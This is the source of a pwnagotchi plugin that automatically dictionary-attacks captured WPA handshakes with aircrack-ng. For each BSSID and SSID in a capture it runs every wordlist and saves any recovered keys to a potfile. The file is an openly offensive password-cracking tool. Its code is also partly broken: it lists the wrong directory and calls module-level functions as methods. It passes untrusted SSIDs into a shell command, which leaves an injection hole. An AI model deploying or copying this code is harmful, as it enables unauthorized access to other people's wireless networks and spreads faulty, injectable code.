from pwnagotchi import plugins
from scapy.all import rdpcap
import logging
import subprocess

"""
Aircrack-ng and scapy needed, to install:
> apt-get install aircrack-ng; pip install scapy
Upload wordlist files in .txt format to folder in config file (Default: /usr/share/wordlists)
Cracked handshakes stored in handshake folder in a file called cracked.potfile
nothingbutlucas version of display-password plugin can be used to display cracked passwords
"""


class FastDictionary(plugins.Plugin):
    __author__ = "nothingbutlucas"
    __version__ = "1.0.0"
    __license__ = "GPL3"
    __description__ = "Run a fast dictionary scan against captured handshakes. Based on rossmarks.uk plugin quickdic.py"
    __dependencies__ = {
        "apt": ["aircrack-ng"],
        "pip": ["scapy"],
    }

    def __init__(self):
        self.text_to_set = ""

    def on_loaded(self):
        generate_log("Plugin loaded.")
        check_aircrack_installation = subprocess.run(
            ["/usr/bin/env", "which", "aircrack-ng"], stdout=subprocess.PIPE, text=True
        )

        if check_aircrack_installation.returncode == 0:
            generate_log("aircrack-ng is installed. Waiting handshakes to crack!")
            self.aircrack = check_aircrack_installation.stdout.strip()
            self.needs_install = False
        else:
            generate_log("aircrack-ng is not installed!", type="WARNING")
            self.needs_install = True

    def crack_handshake(self, filename, bssid_or_ssid, type="SSID"):
        """Crack the handshake using aircrack-ng"""
        try:
            import os
            generate_log(
                f"Cracking handshake for {bssid_or_ssid} - {filename}", type="DEBUG"
            )
            # Create arguments for aircrack-ng
            cracked_file = filename.replace(".pcap", ".cracked")
            if type.upper() == "SSID":
                argument = "-e"
            else:
                argument = "-b"
            wordlist_folder = self.options.get(
                "wordlist_folder", "/usr/share/wordlists"
            )
            list_of_wordlists = os.listdir()
            for wordlist in list_of_wordlists:
                # Run the command on real time
                # If last character of self.options['wordlist_folder'] is /, remove it
                if wordlist_folder[-1] == "/":
                    wordlist_folder = wordlist_folder[:-1]
                command = f"aircrack-ng -w {wordlist_folder}/{wordlist} {filename} {argument} '{bssid_or_ssid}' -l {cracked_file} -q"
                generate_log(command, type="DEBUG")
                time_per_wordlist = int(self.options.get("time_per_wordlist", 5))
                time_per_wordlist *= 60
                try:
                    subprocess.run(command, timeout=time_per_wordlist, shell=True)
                except subprocess.TimeoutExpired:
                    generate_log(
                        "Timeout expired, trying next wordlist", type="DEBUG"
                    )
            generate_log(
                f"Aircrack-ng finish for {bssid_or_ssid} - {filename}", type="DEBUG"
            )
            return cracked_file
        except Exception as e:
            generate_log(
                f"Error cracking {bssid_or_ssid} - {filename}: {e}", type="ERROR"
            )
            return ""

    def on_internet_available(self, agent):
        """Install aircrack-ng if needed and internet is available"""
        if self.needs_install:
            generate_log("Internet available. Installing aircrack-ng")
            self.install_aircrack()
        return

    def update_face(self, agent, text):
        """Updates the face with the text provided"""
        display = agent.view()
        display.set("status", text)
        display.update(force=True)
        return

    def delete_file(self, agent, filename):
        """Deletes a handshake"""
        self.update_face(agent, f"Deleting empty pcap: {filename}")
        subprocess.run(["rm", "-rf", f"/root/handshakes/{filename}"])
        return

    def on_handshake(self, agent, filename, access_point, client_station):
        """Execution when a handshake is captured"""
        try:
            # Search all the SSID and BSSID
            ssids, bssids = self.find_ssid_and_bssid(filename)
            if not ssids and not bssids:
                generate_log(
                    f"No SSID or BSSID found, deleting pcap file {filename}"
                )
                self.delete_file(agent, filename)
                return
            # Search for EAPOL packets
            packets = rdpcap(filename)
            has_eapol = False
            for packet in packets:
                if packet.haslayer("EAPOL"):
                    # Sometimes, just one EAPOL packet is not enough to crack the handshake
                    generate_log(f"Handshake found on {filename}", type="DEBUG")
                    has_eapol = True
                    break
            if not has_eapol:
                generate_log(f"No handshake, deleting pcap file {filename}")
                self.delete_file(agent, filename)
                return
            else:
                generate_log(
                    f"Handshake confirmed on file {filename}", type="DEBUG"
                )
                cracked = False
                # Try to crack the handshake
                for bssid in bssids:
                    cracked_file = self.crack_handshake(filename, bssid, "BSSID")
                    if self.has_cracked(cracked_file):
                        generate_log(
                            f" Handshake for {bssid} cracked on {filename}"
                        )
                        cracked = True
                        self.update_face(agent, f"{bssid} cracked")
                        break
                if not cracked:
                    for ssid in ssids:
                        cracked_file = self.crack_handshake(filename, ssid, "SSID")
                        if self.has_cracked(cracked_file):
                            generate_log(
                                f" Handshake for {ssid} cracked on {filename}"
                            )
                            cracked = True
                            self.update_face(agent, f"{ssid} cracked")
                            break
                if not cracked:
                    generate_log(
                        f"Was not possible to crack any handshake on {filename}"
                    )
        except Exception as e:
            generate_log(f"Unexpected error: {e}", type="ERROR")


def generate_log(text, type="INFO"):
    """Create a log with the plugin name"""
    if type == "INFO":
        logging.info(f"[FAST_DICTIONARY] {text}")
    elif type == "ERROR":
        logging.error(f"[FAST_DICTIONARY] {text}")
    elif type == "WARNING":
        logging.warning(f"[FAST_DICTIONARY] {text}")
    elif type == "DEBUG":
        logging.debug(f"[FAST_DICTIONARY] {text}")


def install_aircrack():
    """Installs aircrack-ng"""
    generate_log("Installing aircrack-ng")
    subprocess.run(["apt", "install", "aircrack-ng", "-y"])
    generate_log("aircrack-ng installed")


def find_ssid_and_bssid(filename):
    """Find all the ssid and bssid on the pcap file"""
    try:
        from scapy.layers.dot11 import Dot11, Dot11Elt

        list_of_ssids = []
        list_of_bssids = []

        packets = rdpcap(filename)
        for packet in packets:
            if packet.haslayer("Dot11"):
                if packet[Dot11].type == 0 and packet[Dot11].subtype == 8:
                    ssid = packet[Dot11Elt].info.decode()
                    bssid = packet[Dot11].addr2
                    if ssid not in list_of_ssids:
                        list_of_ssids.append(ssid)
                    if bssid not in list_of_bssids:
                        list_of_bssids.append(bssid)
        return list_of_ssids, list_of_bssids
    except Exception as e:
        generate_log(f"Error finding ssid or bssid on pcap: {e}", type="ERROR")
        return [], []


def has_cracked(cracked_file):
    """Search for the key in the cracked file"""
    # TODO: - Verify the writing so the display-password plugin can use it
    try:
        if "KEY FOUND" in open(cracked_file).read():
            with open("fast_dictionary_cracked.potfile", "a") as f:
                f.write(open(cracked_file).read())
                return True
        else:
            return False
    except FileNotFoundError:
        generate_log(
            f"Was not possible to crack {cracked_file.replace('.cracked', '')}",
            type="DEBUG",
        )
        return False
    except Exception as e:
        generate_log(f"Error verifying cracking: {e}", type="ERROR")
        return False


